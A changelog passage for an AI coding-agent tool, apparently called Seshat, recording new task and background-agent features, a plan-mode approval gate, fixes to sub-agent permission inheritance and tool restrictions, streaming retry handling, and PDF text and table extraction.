- **`task_create` and `task_update` take a list.** Keeping a five-step list took 15 calls (five `task_create`, then two `task_update` per step), each one a round trip to the model, which on a slow provider costs more than the work being tracked. `task_create` now accepts `tasks` (the whole list in one call) and `task_update` accepts `updates` (for example complete one task and start the next together). The single-task form is unchanged. The terminal UI's task list reads both forms, and the permission check no longer refuses an update that has no top-level `taskId`.

- **The runtime context gives the git branch and the size of the working tree.** `git_root` and `git_branch` were set to empty strings and used nowhere, so the agent had to run a command to learn the branch. The context now has `branch:` and `working tree:` (clean, or how many files are modified or untracked). It names no file and only passes a branch name made of ordinary characters: both come from the repository, and the runtime context is part of the system prompt, which the project-trust check does not cover.


### Fixed

- **A background agent can be waited for, and its answer read.** An agent started with `agent` in the background could only be polled with `task_get`, which returned a status and nothing else (a blank "Command:" line for an agent, no answer): a session waited for six of them by running `Start-Sleep -Seconds 120` in a shell between checks, and could only get their results by reading their output files. `task_get` takes `wait_seconds` (at most 600) and, for a background task or agent, waits for it to finish; it returns the final output (cut at 20,000 characters, with a flag) and, for an agent, the description it was given; a wait that runs out says `timedOut`. Several waits can run in the same response. The terminal interface shows the agent's task instead of an empty command. The prompt and the result of `agent` say to wait this way and never with a sleep in a shell. `wait_agent` (for `spawn_agent`, and now also for the task ID of a background `agent` instead of answering "agent not found") and `job_output` with `timeout_ms` (for bash jobs) already waited; no separate sleep tool was added, since the three cover what there is to wait for.

- **The session list (`ctrl+s`) shows the conversations, not every sub-agent the model launched; its times are right; and "continue" takes the latest conversation.** A sub-agent or a background agent runs in a session of its own, and the list showed each one as a conversation (a research that launched six agents added six entries named after their tasks). A session now records the session that launched it (`parent_session_id`, from the session whose tool call started it, so also for an agent started by an agent) and `SessionInfo` gains `Subagent` and `ParentID`; the list leaves sub-agent sessions out, and so does `seshat sessions` (`--subagents` lists them). Sub-agent sessions saved before this have no parent but are recognised by their tool surface profile, so they disappear from the list too. Deleting a conversation deletes the sessions it launched, since they can no longer be deleted on their own. Two more defects in the same list: the times read "a long while from now" because the dialog read milliseconds as seconds, and the list was not sorted, so `--continue` took whichever session came first rather than the latest. Not done: a way to open a sub-agent's session from its conversation.

- **The agent now proposes plans through the plan review screen in execute mode, instead of writing them as text and asking "do you approve?".** `submit_plan` refused outside plan mode ("can only be called in plan mode"), and the prompt sent the agent to `enter_plan_mode` for a plan, which it almost never did; so a plan the user had asked to validate (a research, a large change) came out as plain text with no screen and no button to answer. `submit_plan` now works in any mode; its result tells the agent to stop and wait for the answer, and only mentions `exit_plan_mode` when plan mode is on. The prompt says to send a plan with `submit_plan`, never as text, when a choice belongs to the user or the user asked to validate the plan, including the research plan. Plan mode is described for what it adds, a read-only guard that the user turns on; the agent no longer enters it just to propose a plan, and `enter_plan_mode` says so. The approval message no longer claims plan mode was exited when it was never on.

- **`scripts/setup.ps1` could not run on Windows PowerShell 5.1.** The file is UTF-8 without a byte order mark and held em dashes and box-drawing characters; PowerShell 5.1 reads such a file as ANSI, where byte `0x94` of those characters is a typographic double quote, which broke the strings (`Missing closing '}'`, `The string is missing the terminator`). It is now plain ASCII and parses.

- **Running several tools at once could kill the whole process with "fatal error: concurrent map iteration and map write".** The tools of a concurrent batch each received the same `Metadata` map: the tool context was copied by value, the map was not. Each tool wrote `transcript_messages` into it while another was reading it to ask for its permission (`cloneMetadata`). A concurrent map read and write is a fatal error in Go: it ends the process, a `recover` cannot catch it, and the session ended with a stack trace in the terminal. It needs two or more tools launched in the same turn, so it appeared after a long run and then not again. Each tool now gets its own copy of the metadata. A test fails without the fix (it also reproduces "concurrent map writes").

- **The `bash` tool works on Windows without WSL.** It picked the shell with a bare `bash` on the PATH, which on Windows is usually the WSL launcher (`System32` or `WindowsApps`); with no Linux distribution installed every command failed with `execvpe(/bin/bash) failed: No such file or directory`, and the agent tried `ls -la` and then `dir` in turn. On Windows the tool now looks for Git Bash first (next to `git` on the PATH, then the usual install folders), never takes the WSL launcher, takes another real `bash` on the PATH if there is one, and falls back on PowerShell (`pwsh`, then `powershell`, run with `-NoProfile -NonInteractive -Command`). `monitor` used a hard-coded `bash` and now uses the same shell. The tool description tells the model which shell it is in on Windows (Git Bash: POSIX commands, forward-slash paths; PowerShell: PowerShell syntax). `SESHAT_BASH_SHELL` names another shell; like the other `SESHAT_BASH_*` settings it is refused from a `.env` file, since it decides what is run. The permission rules still read a PowerShell line with the POSIX parser, which is conservative (an unknown form asks) but not exact.

- **A start with no model chosen no longer stops on "provider anthropic requires API key", and the models dialog defaults follow the registry order.** The previous fix filled in a default model when none was configured, and when no provider was configured either it fell back on Anthropic, so the start validated a provider that had no key. No provider and no model is the "configure me" state the interface handles, and it is back. A user whose key is stored in the credentials database (added from the interface) but who never picked a model now starts on that provider's default model, unless an environment variable already names a provider. Separately, the catalog view in `pkg/config` sorts each provider's models by name, and both the models dialog and `seshat config` took their defaults from that sorted list: the "large" default was the alphabetically first model (for example `claude-fable-5-1` for Anthropic) and the "small" one the alphabetically last. They now follow the registry (first model is the default, last is the small one; a provider with only two models uses the same one for both), and the dialog lists the models in that order, with image support taken from the registry.

- **The model chosen in the terminal interface is kept for the next start, and a choice of small model no longer replaces it.** Picking a model in the models dialog only changed the running session: `UpdatePreferredModel` kept it in memory and never wrote it anywhere, so the next start fell back to the default ("anthropic:" with no model in the header). The interface also sets a small model right after a large one is chosen, and that call replaced the model the session ran on with the small one. The large model is now written to the credentials database (the `model` entry that `seshat config` already uses and that startup already reads), and a small-model update leaves the session model alone. A start with no model configured or remembered now opens on the provider default (for example `anthropic:claude-sonnet-5-5`) instead of on an empty model. A model set in the YAML configuration still takes precedence over the remembered one, as before. `make build-cli` and `make build-grpc` now write `seshat.exe` and `seshat-grpc.exe` on Windows: without the suffix they wrote a file named `seshat` beside the `seshat.exe` that kept being the one that ran, so a rebuild never showed.

- **A turn that fails or is cancelled keeps what it did.** When a turn ended in an error, or the user pressed Esc, the session threw away every message the turn had produced and kept only the user's first message. A long task (questions, plan, searches, a sub-agent) that failed near its end was therefore forgotten, and "continue" started it again from the first phase. The session now keeps the transcript the loop reached, without counting the turn as completed (the turn limit is untouched). A tool call that was cut before it returned gets an error result saying it may or may not have run, because providers reject a call without a result and because dropping the call would hide that a command could have run. A short note ends the transcript and says why the turn stopped (the first line of the error, or "interrupted by the user"), so the model resumes instead of restarting. A turn that produced nothing leaves the transcript as it was. This changes the engine for every client, not only the terminal UI.

- **A pick-one question moves on by itself.** In the terminal UI's question panel each answer had to be followed by Tab before the next question showed. Choosing an option (Enter, or a click) now goes to the next question, and Enter on the last one sends the answers. Multi-select questions still wait for Tab, and "Other" opens the text field first. A click on the last question selects it and Enter sends it: a click cannot return the command that sends the answers.

- **A running sub-agent shows that it is working.** Its only sign of life was a scrambling-characters animation. It now shows a calm spinner with the agent's name, the elapsed time and the number of tools it has run (`⠹ Explore Agent working · 2m05s · 53 tools`), so a sub-agent that is quiet for minutes still reads as working.

- **The ERROR block in the chat says what the error was.** When a turn ended with an error the block was an empty red badge: the error was dropped when the turn was recorded. Its first line is now the title and the whole error the details.

- **Level-1 headings are no longer a solid block.** They were drawn with a filled orange background that hid the text. Headings are bold and coloured, and a test checks all three themes.

- **A streamed request is retried before its first byte, and `Retry-After` is read.** Only a request without streaming went through the retry with backoff; the five streaming entry points (Anthropic, OpenAI-compatible including Z.ai and OpenRouter, Codex, Gemini, Ollama) called `sendMessage` directly. Every real turn streams, so a 429 or a 503 was left to the retry of the engine loop, which tries three times after 250 ms, 500 ms and 1 s (about two seconds in all), and the `Retry-After` header was never read: the retry code that does read it was unreachable from the path that runs. A provider that limits free models per minute ended the turn after two seconds. The streaming requests now go through the same retry: up to 5 attempts, exponential backoff from 1 s to 30 s with jitter, and the wait the provider asks for. A `Retry-After` longer than 2 minutes fails the request at once with the provider's own message, and a 429 that says the quota or the balance is spent (`insufficient balance`, `exceeded your current quota`, `free-models-per-day`, ...) is not retried, since waiting does not bring it back. A stream that breaks after the response is open is still the loop's to recover. Found by an audit and measured against Z.ai and OpenRouter free models.

- **A streamed response that goes silent is given up on after three minutes.** The body of a stream was bounded by the context only (the code says so), so a provider that stopped sending without closing the connection (a half-open connection, a hung gateway) held the turn until the user pressed Esc, with a spinner that said it was running. The body now closes itself when no byte arrives for `SESHAT_STREAM_IDLE_TIMEOUT` seconds (default 180, `0` turns it off). A keep-alive comment or a ping counts as a byte; Z.ai's pauses of up to twenty seconds between bursts are far inside the limit. The error says no data was received for that long, and the engine loop treats it as a transient network failure and retries.

- **The terminal UI says what it is waiting for when a provider refuses a request.** While the runtime waited to retry a 429 or a 503 the status line kept saying "running" with a counter, which reads like a model that is thinking and has stopped. The retry now emits a `provider.retry` runtime event (attempt, attempts in all, wait, reason) before each wait, through the emitter that the turn already puts on the context, and the status line shows it: `rate limited (429), retrying in 12s (attempt 2/5) (14s)`. The notice clears when the response resumes. A host that listens to runtime events gets the same event (`sdk.RuntimeEventTypeProviderRetry`). The turn's emitter also fills in the session and turn identifiers of an event that does not carry them.

## [1.7.0] - 2026-10-13

### Added

- **A host can record the user's plan approval, so `exit_plan_mode` is reachable outside the terminal.** The gate added in 1.6.0 refuses the exit while the plan you were shown is awaiting your answer, and that answer lived in a process-global review state no host could write — so a product that shows plans in its own UI could neither unblock the model nor leave the decision recorded (`ClearPlanMode`, its only way out, drops the mode without it). `sdk.ApprovePlan(sessionID)` records it, and `session.ApprovePlan()` is the same call on a live session. The package-level form takes an id because a host that persists its sessions reloads them per turn and has nothing to call the moment the user clicks: the answer still has to reach the next turn's check. It records the decision only — leaving the mode stays the model's `exit_plan_mode` or the host's `ClearPlanMode`.
- **`ClientConfig.TaskNudgeLimit` bounds the task-list reminder.** The bound added in 1.6.0 (`LoopConfig.TaskNudgeLimit`, 3 by default) was reachable only by building an `engine.LoopConfig` by hand, which an embedding host cannot do without giving up the rest of the client configuration; it is now a client field with the same meaning.

### Changed

- **The plan-mode prompts describe the approval-first flow.** They still told the model to exit plan mode when the plan was ready for approval — the exact step the 1.6.0 gate now refuses — so the model's own instructions pointed at a call that was going to be rejected. The core prompt's plan stage, the `enter_plan_mode`/`exit_plan_mode`/`submit_plan` descriptions, the plan-mode instructions and `ask_user_question` all say to submit the plan with `submit_plan`, wait for the review, and call `exit_plan_mode` only if plan mode was not already left for the model. The refusal `write_file`/`edit_file` return in plan mode now points at `submit_plan` for the same reason.
- **The `verify` agent type is described as the read-only audit it is.** The delegation table in the core prompt, the agent tool's prompt and the built-in agent list all called it a way to run tests and check results after implementation, which the profile cannot do — it has no execution tools. It is now described as a read-only audit of agent definitions, tool permissions and compliance, so a model stops delegating a test run to it and expecting one back.

### Fixed

- **Entering plan mode could refuse `exit_plan_mode` before the new plan had been submitted.** Entering again left the previous cycle's review pending, and the gate reads that state, so the first exit of the new cycle was rejected over a plan the user was never shown. `ForcePlanMode` now starts a fresh review cycle.
- **The task-list reminder could mangle the last character of the subject it quoted.** A long subject was cut with a byte slice, which lands inside a multi-byte rune for accented or non-Latin text and leaves a replacement character in the text handed back to the model. It is now cut on a rune boundary, inside the same bound.
- **`TaskNudgeLimit` could not be turned off.** Zero and every negative value were replaced by the default before the loop saw them, so a caller asking to disable the reminder got three. Zero now means "use the default" and a negative value is the explicit off switch, in `LoopConfig` and through `ClientConfig` alike.

## [1.6.0] - 2026-10-12

### Added

- **`shift+tab` enters and leaves plan mode, so you can design a plan with the agent.** Plan mode was reachable only by starting the session with `--mode plan` or by letting the model call `enter_plan_mode` — leaving you no way to *ask* for the collaboration the mode exists for. The key is the one Claude Code, Cursor and Codex already use for it, the command palette offers the same action as `toggle_plan` (labelled "Enter Plan Mode" / "Leave Plan Mode"), and the switch goes through the same state change the model's own transition makes (`ForcePlanMode`/`ClearPlanMode`), so leaving restores the previous permission mode and the write tools keep refusing while it is active. Saved sessions keep the mode, as before.
- **API keys are never displayed in the configuration dialogs.** The provider API key field (`Settings → Providers → LLM`) and the web search key field render their value as bullets from now on, both while a key is being typed and when one is already saved, so a secret stops being readable over a shoulder or in a screen recording. `ctrl+r` reveals the value while the field is edited, and the value is hidden again on tab, on validation and on save, so a key is only ever on screen when it was explicitly asked for.

### Changed

- **Plan mode is now entered for a decision fork, not for task size.** The prompts listed "a feature, refactor, migration, or broad bug fix" and "the change spans several files or subsystems" as reasons to enter — a reason to *organise* work, which is what the tracked task list is for. `enter_plan_mode` and the core prompt now both say to enter when a choice belongs to the user and settling it before a file is touched costs less than settling it after: several defensible designs and no indication which, work that is hard to undo or expensive to redo (migrations, auth, deletions, a published contract), or acceptance criteria you cannot read off the repository. A large or unfamiliar area is explicitly not a reason on its own, since reading is free in either mode. Entering asks nobody, and that is deliberate rather than an oversight: the mode is read-only and reversible, so the human checkpoint is on the plan itself, where `exit_plan_mode` and `submit_plan` already carry it. The tool used to declare an approval of its own that the permission pipeline silently discarded; that unreachable ask is gone rather than left reading as a gate (TODO.md H9).
- **`exit_plan_mode` no longer leaves plan mode while a submitted plan is still waiting for your answer.** The precondition existed in the prompt and nowhere else: `submit_plan` recorded a plan as `pending` and no code ever marked one approved, while `exit_plan_mode` checked only that the session was in plan mode - so it could clear the mode, which is what grants write access (`write_file` and `edit_file` deny while `ExecutionMode` is `plan`), and tell the model "User has approved your plan" whether or not you had decided anything. It is now refused unless the plan you were shown has been approved: `submit_plan` records the submission, approving in the review dialog records the answer, and a refused exit leaves the session in plan mode with the tool's own side effects untouched (no plan written, no mode change). Revising a plan after feedback returns it to awaiting review, because a revised plan is a different plan. A session that never submitted anything keeps its exit - `submit_plan` is optional, so a gate that assumed otherwise would leave plan mode with no door. The preview an unapproved exit builds is still never shown to you; that half of the defect stays open (TODO.md H9).
- **A turn no longer ends while the tracked task list still has unfinished items.** The task tools and the system prompt asked the model to keep that list fresh, and nothing enforced it — so a model could write its plan, do part of it and stop, leaving the user watching a stale checklist. When a response comes back with no tool call, the loop now reads the session's tracked tasks and, if any are still `pending` or `in_progress`, sends the model back to the next one with the list named. Two bounds keep that cheap: at most `LoopConfig.TaskNudgeLimit` reminders per turn (3 by default), and a reminder only goes out when the open list changed since the previous one, so a model that ignores it is not asked twice about the same list. A list with nothing open, a session that never tracked anything, and plan mode all end the turn exactly as before — in plan mode, stopping to wait for your approval is the correct terminal state, not a stall to correct.
- **Task tracking is no longer framed as something that follows plan mode.** The prompts and tool descriptions implied a plan had to come first: `task_create` opened its "when to use" list with "After plan approval", `enter_plan_mode`'s own "do NOT enter plan mode" list had no entry for work that is multi-step but unambiguous, and `exit_plan_mode` described task creation as its immediate consequence. An agent facing an ordinary three-step request therefore had a reason to spend a full plan-mode round of alignment before it was allowed to track anything, which is the opposite of what the tools are for. Direct task creation is now the first case in `task_create`, plan mode is named as a prerequisite nowhere, and the core prompt states that a task list is not a plan: multi-step work whose approach is already clear gets `task_create` in execute mode, and `enter_plan_mode` is reserved for work whose approach genuinely needs the user's alignment. The core prompt also now says, in the working rules, that the tracked list is the user's live progress and must be updated after each step rather than filled in at the end.
- **The terminal wordmark spells SESHAT and no longer carries the Charm™ mark.** The big logo now draws the six letterforms S, E, S, H, A, T instead of the previous set, and the version row keeps its right-aligned place on the line above it. The `Charm™` label is gone from the wide logo, from the compact header and from the small render used by the sidebar, along with the three styles that colored it (`Header.Charm`, `Logo.CharmColor`, `Logo.SmallCharm`). The diagonals, the gradient and the stacked compact form are unchanged.

### Fixed

- **A dialog with a filter or key field was one column wider than its own border, which left a small gap before the right edge.** The width handed to those fields reserved a single column for the cursor, but the field renders three: its prompt plus the cursor cell. The card therefore grew by one column while its separators stayed where they were, so the horizontal rules stopped one cell short of the border - visible in `Settings → Providers → LLM` and in the provider detail pane. The width now comes from one helper that measures the prompt and the cursor on the component itself rather than assuming them, and `RenderContext.Render` truncates every part to the dialog's inner width, so no part can widen a card again whatever it contains. A test renders all eleven Settings views off-screen and asserts that each one is exactly the card width with its separators touching the column before the border.
- **The `configured` badge of a provider in `Settings → Providers → LLM` could disagree with the saved configuration.** The row captured its state when the list was rebuilt, so a key saved from the provider detail pane was not reflected in the badge until the next rebuild - a filter keystroke, or reopening Settings. The row now reads the live config on every render, the way the theme and capability rows already do.

## [1.4.1] - 2026-10-11

### Fixed

- **A stream that dropped mid-response, or ended with no finish signal and nothing visible to show for it, was silently treated as a successful completion.** Anthropic-shaped streams (anthropic/bedrock/vertex/workers-ai) only ever raised an error on a genuine read failure - a clean connection close (`io.EOF`) before the protocol's sole terminal event (`message_stop`) ever arrived looked identical to a normal finish. OpenAI-compatible streams (Z.ai, Ollama, and other `openAICompatAdapter`/`ollamaAdapter` providers) had the same gap from the other direction: a missing `finish_reason` defaulted to `end_turn`, so a connection that died before producing any text or tool call - including a reasoning model that burned its whole output budget with nothing visible to show for it - was returned as an ordinary (if empty) response instead of failing. Both paths now surface a retryable `ErrCodeAPIResponse` in that case, which routes through the engine's existing recovery path (`Loop.isRecoverableError`/`tryRecovery`) instead of handing the caller a truncated answer with no indication anything went wrong.
- **An in-band provider error mid-stream was silently dropped on OpenAI-compatible providers.** A gateway (e.g. OpenRouter-style routing) that surfaces an upstream failure as `data: {"error": {...}}` inside an otherwise-200 SSE stream, rather than a non-200 HTTP status, had no matching field in the decoded chunk shape - it unmarshalled into zero `Choices` and was treated as a no-op delta, so the stream finished looking like an ordinary (possibly truncated) success. Now decoded and returned as an error through the same recovery path as the point above.
- **Reasoning that a model emitted as raw `<think>...</think>` tags in its normal text channel, instead of through a provider's structured reasoning field, reached the live display as plain text.** This affects models (commonly DeepSeek-R1/QwQ-style, served locally via Ollama or through an OpenAI-compatible gateway) that don't separate reasoning from content the way Anthropic's native extended thinking or OpenAI's `reasoning_content` field do. `CreateMessageStreamResultWithCallback` now wraps the live `onChunk` callback with an incremental tag filter that reclassifies detected think-spans as `thinking_delta` chunks before they reach the caller - a safe no-op for every provider that doesn't do this. The persisted response and conversation history are untouched (they keep the raw text, same as the model will see it on its next turn).

## [1.4.0] - 2026-10-11

### Changed

- **Plan mode no longer auto-allows file writes/edits.** `write_file`/`edit_file` used to fall into the same AcceptEdits-style auto-allow as `PermissionModeAcceptEdits` whenever `ExecutionMode == "plan"`, so a plan-mode session asked fewer questions about writing files than a normal session would - the opposite of "tools are described but not executed." Both now deny outright in plan mode; the plan's own content never went through these tools (`exit_plan_mode` takes it as a parameter).
- **`workflow.Node`'s `Agent`/`MaxTurns` fields are honored by the default executor.** `Client.RunWorkflow`'s built-in executor now runs a node through `Client.RunAgentTask` (a new public method) when `Agent` is set, instead of always calling `Ask` with no agent type or turn limit.
- **Sub-agents spawned from a `never`-mode parent session now run in `never` instead of always `bypass`.** Every other parent mode still spawns a `bypass` child (unchanged) since there is no UI path today for a synchronous sub-agent to show an interactive prompt - but `never` means the parent wants nothing escalated and failures returned to the model, and a `bypass` child silently defeated that. The built-in `plan` agent type no longer has `write_file`/`edit_file` (it never used them; its own prompt now says so explicitly), matching the read-only guarantee `plan` execution mode already makes. The `agent` tool's own example for the `verify` type no longer tells the model to use it for running tests - it now matches what `verify` actually does (auditing agent definitions/permissions).
- **A skill's `shell.before` commands are no longer silently ignored.** The skill's prompt now tells the agent to run them through its own Bash tool call before starting the task, asking for permission first unless already granted - the same prompt-injection pattern already used for `requires.install-cmd`. `shell.after`/`on_error`/`on_complete` and `hooks` are still not executed (the latter is not planned as a separate system - use `internal/hooks` instead).
- **Several `ErrCode*` constants are now actually used** on tool-execution-failed, tool-not-found, permission-check-failed, tool-permission-denied, and session-closed errors, so callers can tell these failures apart by `(*types.EngineError).Code` instead of only by message text.

### Fixed

- **A `context: fork` skill, or a sub-agent with a restricted `Skills` list, could still escalate past a `never`-mode parent session.** The `never`-mode inheritance fix above only covered `agent_tool.go`'s three direct spawn sites; `SkillForkRunner.RunForkedSkill` (the fork-skill path) and `RestrictSessionSkills` (which handed a skill-restricted sub-agent a fork-less skill tool, breaking `context: fork` for it entirely) were missed because one didn't exist yet when that fix landed. Found by a post-session audit and fixed the same way.
- **A `pre_compact` hook that denied compaction skipped the request-too-large check entirely**, so a turn whose transcript was already over the provider's limit could reach the provider instead of failing locally with a typed `ErrCodeCompactFull` error (M1 in TODO.md), just not on this one path. Found by the same audit.
- **A background sub-agent (`agent({run_in_background: true})`) never inherited a `never`-mode parent's permission mode either** - unlike every other sub-agent spawn path, it ran under whatever the client's default permission mode is. The background session is created from the same engine as the foreground one, which shares exactly one prompt function across every session it creates, so an "ask" from the background agent could have routed through the same prompt the foreground session uses instead of failing quietly. `tasks.Manager.CreateAgentTask` now takes a `PermissionMode` and applies it to the session before the background run starts.
- **Auto mode's headless-specific deny paths (no classifier configured, PowerShell, `request_permissions`) could never actually fire.** All three branch on `ShouldAvoidPermissionPrompts`, which nothing ever set to `true` - a request in a context with no way to show a prompt fell through to a later, more generic deny instead (same outcome, worse error detail; not a security gap). `Loop.buildExecuteRequest` now derives it from whether a prompt function is actually reachable for the current context, via a new `Integrator.HasPromptFn`.
- **A background sub-agent (`agent({run_in_background: true})`) ignored the requested agent `type` entirely**, beyond echoing it back in the result - it ran under the engine's default identity instead of the type's own system prompt, and from the top-level tool surface profile instead of the `subagent` one every other sub-agent path gets. `tasks.Manager.CreateAgentTask` now takes the resolved system prompt and applies it, and creates the session with the `subagent` tool-surface profile.
- **No sub-agent tool restriction has ever actually worked, on any spawn path.** A built-in agent type's own `Tools` list and a caller's explicit `tools: [...]` were accepted and validated, then silently had no effect - every sub-agent (synchronous, forked, worktree, background, skill-forked, spawned, resumed, or run from a workflow node) got the entire tool registry regardless. Root cause was two independent breaks: `RunConfig.Tools` (the pool the restriction filtered from) was `nil` at every call site in the repo, and even populated it would have failed outright on any tool the session already had (session creation populates the full registry before the old filter-then-register step ever ran, and registering a duplicate name errors). A third, separate mechanism - the session's declared tool-surface profile - turned out to be a no-op too: nothing in the codebase ever opts a tool out of any profile. Fixed by pruning the session's already-populated tool set to the resolved pattern list instead of trying to register a filtered subset onto it (`agent.RestrictSessionTools`), applied uniformly from `RunAgent` and from the background dispatch path. Sub-agent sessions that relied on the (accidental, undocumented) unrestricted access this bug gave them will now see only the tools their type or the caller's `tools: [...]` actually name.

### Removed

- **`pair_programming` execution mode**, including `sdk.ExecutionModePairProgramming`. It had no entry point anywhere (no tool, no command - unlike plan mode's `enter_plan_mode`/`exit_plan_mode`) and no execution-time effect beyond a TUI status label that could never actually display. Removed rather than left as unreachable scaffolding for a collaborative-suggestions feature nothing builds toward today.
- **`agent.SecurityChecker` and its `ValidateAgent` method** (`internal/agent/verify.go`), along with `ValidationResult`/`ValidationIssue` and the `Category*`/`Severity*` constants. A Go re-implementation of the checks the `verify` agent type's prompt already asks the model to do, with no callers anywhere in the repository, and whose rules had gone stale (it flagged `bypass` + `general-purpose` sub-agents as a critical violation, which the fix above makes the normal default).
- **MCP OAuth scaffolding**: `ConnectWithOAuth`, `ShouldUseOAuth`, `GetOAuthConfig`/`MCPOAuthConfig`, and the `SESHAT_MCP_CLIENT_ID`/`_CLIENT_SECRET`/`_AUTH_URL`/`_TOKEN_URL`/`_SCOPES` env vars they alone read. `ConnectWithOAuth` was a stub that performed no actual OAuth handshake and was never called by anything that connects MCP servers - removed rather than left as working-looking but non-functional. Also removed `RegisterPluginMcpServer`/`GetPluginMcpServers`, an append/getter pair with no loader, CLI flag, config schema, or plugin-discovery convention to wire into.

## [1.2.73] - 2026-10-05

### Changed

- **The HNSW store has its own graph** (`internal/vector/hnsw_index.go`), in place of `github.com/coder/hnsw`. That library stops its search as soon as a step finds nothing closer, so `efSearch` only bounded a queue and the search was greedy: measured against an exact search it found 8% of the true ten nearest neighbours of 2,000 random vectors and 2% of 20,000, whatever `efSearch` (20 to 200) and `M` (16 or 32), and 35% / 17% on clustered vectors. ## [1.2.61] - 2026-10-03

### Added

- Tables in PDFs are read as tables, in pure Go, from the lines the page draws. The page's rulings (stroked lines and rectangle edges, and filled bars thin enough to be rules) are read from the content stream and two kinds of table are recognised: a grid (horizontal and vertical rules that cross; merged cells are resolved, and a header that spans columns or rows is joined into one header row) and a ruled block (a top rule, a header rule and a bottom rule, with no vertical lines, as in most papers; its columns are the white gaps in the text, taken from the body so a header wider than its column cannot hide them). A table stays where it was in the reading order, its text is not repeated outside it, and its cells come out as markdown. On the documents tried (arXiv papers, a technical report, an IBM Redbook) it finds the same tables as Docling's TableFormer page by page. A table with no rules at all is not found: it is left as text, because a borderless table and two columns of prose cannot be told apart reliably from the text alone.
- What is not a table is rejected: the header and footer rules of a page, a cover page of headlines and captions (mixed sizes, paragraph cells), a boxed listing (monospaced font, brackets and operators as cells), and two rules with a caption or a sentence between them (a caption splits one set of equal rules into the tables above and below it).

## [1.2.58] - 2026-10-03

### Changed
- `read_file` reads a PDF page by page, with a `--- page N ---` marker before each page. With no `pages` it reads from the start; with `pages` ("3", "10-20", "5-") those pages. A read is bounded by cost, not page count: it stops at a page boundary after 120,000 characters, or after sending 20 pages with no text layer to the document reader, and says which page to continue from. The result names the pages that hold images or have no readable text.
- Only the pages a read returns are read, in batches of ten, and each is remembered per file (path, size, modification time), so the first read of a long document is quick and a page an engine had to read is never paid for twice.
- `internal/pdfsmart` gains `ReadPages` (`Convert` for chosen pages, with options to leave pages with an image but good text to the native reader and to bound engine calls) and `PageCount`. `Convert` behaves as before.
- Native PDF pages are read as markdown, not flat text. Typesetting gives the structure: a line much bigger than the body is a heading (`#` to `###`), lines in a monospace font are a fenced code block with their indentation and spacing restored column by column, bullets and numbers are list items, wrapped lines are one paragraph (a hyphen added at a line end is undone), dot leaders become "…", and a table of contents keeps one entry per line. Formulas are recognised by their math font and position: inline ones become `$...$` with `^{}` and `_{}`, display ones become `$$...$$` with `rac{}{}`, `egin{cases}` and sums with their bounds, read in drawing order because the x the PDF library gives is unreliable for many fonts. Symbols stay as the PDF has them (Unicode math letters). Fraction bars, roots and matrices are not drawn as glyphs and are not recognised; a formula that needs them comes out as its parts in reading order. Tables are not detected.

### Fixed
- Native PDF text had no spaces between words on many PDFs (LaTeX output among them), which draw each word separately and leave the space as a gap: a paragraph came back as one unbroken word, and line breaks were lost. Text is now rebuilt from the position of each glyph, restoring word spaces and lines, and an accent drawn as its own glyph is joined to its letter. This affects every reader built on it (`read_file`, `pdfsmart`, `pkg/documentreading`, `pkg/pdftext`).
- The `pages` parameter of `read_file` was ignored on every text path (a pre-converted `.md` next to the file, native text, and the document reader), so only the raw-PDF fallback honoured it and an agent could not read a page range as text.

### Removed
- `read_file` no longer serves a pre-converted `<name>.md` next to a PDF, since that text cannot be split by page. DOCX, PPTX and XLSX still use it for now.
- The 50-pages-per-request error of `read_file` for a PDF: the size limits above bound a read instead.

- `pkg/dataflow`: `Node` gains a `Tools []string` field (agent nodes only) naming other nodes in the same graph an agent's LLM may call as tools during its turn, in addition to (never instead of) whatever it's wired to via `Connections` - dual-use, not exclusive. A node referenced only this way (no real `Connections` of its own) is no longer scheduled eagerly by the engine; it stays dormant until actually invoked (see the new `BuildAgentTools`/`ToolSpec`). `AgentCaller.Ask` gains a fifth parameter, `graphTools []ToolSpec`, for this - another breaking interface change, same reasoning as `tools` above. `internal/automation`'s `sessionAgentCaller` wires this up for real (register/unregister the resolved tools on the session for just that one turn); every other `AgentCaller` implementation needs updating to the new signature.
- `pkg/dataflow`: the catch-all `agent` node type splits into three - `agent` (now pure identity: just an `agent` slug parameter, a no-op `Execute`), `query` (the actual task - `prompt`/`tools` parameters moved here, plus a new `Agent` field referencing the `agent` node providing its persona), and `tools` (a reusable, individually-toggleable group of capability nodes - its own `Tools` field lists members, a new `disabled` parameter temporarily excludes some without removing the wiring). `BuildAgentTools` is renamed `ResolveTools` and now expands a `tools`-type target recursively, so several `query` nodes can share one capability group. `Node.Tools` ownership widens from "agent only" to "query or tools"; `Validate` gains matching checks (a `query` node requires a valid `Agent` reference; `Tools` may no longer target a `query` node, may target a `tools` node). Breaking change to the old single-node shape - no `AgentCaller` interface change, since only *which* node type calls `Ask` moved, not the signature.

### Fixed
- `internal/execution`: `formatAndTruncateResult` allocated a fresh `ResultMetadata` on every truncation, silently discarding whatever the tool itself had already set there - bash's `ExecutionDuration` and `Additional` (`exit_code`/`stdout`/`stderr`/`sandboxed`/etc.) vanished the moment a long command's output got truncated, along with any other tool's custom metadata. Now preserved; only `ContentReplacement` is added/updated.
- `internal/execution`: `formatAndTruncateResult` truncated on a raw byte offset (`content[:maxSize]`), which can land inside a multi-byte UTF-8 rune (non-ASCII content: French/Arabic/Chinese/Japanese, emoji) and produce invalid UTF-8 in both the truncated content and its preview. Now cuts at the nearest valid rune boundary at or before the limit.
- `internal/memory`: `FileStore`'s three save paths (`SaveProjectMemory`/`SaveUserMemory`/`SaveCrossSession`) wrote directly to the destination file via `os.WriteFile` - a crash mid-write (power loss, OOM kill) could leave a truncated, unparseable JSON file behind, losing whatever was previously saved. They now write to a temp file in the same directory, `fsync`, then atomically rename into place. Memory directories/files also move from world-readable `0755`/`0644` to `0700`/`0600` - this content can include personal preferences, learned instructions, and conversation summaries.
- `internal/rag`: `Service.DeleteFileChunks` capped its stale-chunk search at a fixed ceiling past the new chunk count (500 for a shrunk re-ingest, 2000 for `rag_delete`'s whole-file case) instead of checking how many chunks actually existed - a file that shrank by more than the ceiling, or a whole-file delete on a file larger than 2000 chunks, left everything beyond that ceiling as orphaned vectors with no way to ever reach them again, still returned as phantom results by future searches. Now lists what's actually in the namespace and deletes exactly the matching stale chunks, regardless of count.
- `internal/vector`: `OpenSearchStore.DeleteKeys` issued one HTTP `DELETE` request per key instead of using the `_bulk` API `Upsert` already uses - painfully slow for the thousands of keys a stale-chunk cleanup or whole-file delete can involve, and a good way to blow past a caller's timeout partway through a large batch. Now batches through `_bulk` in `BulkSize`-sized groups, same as indexing.
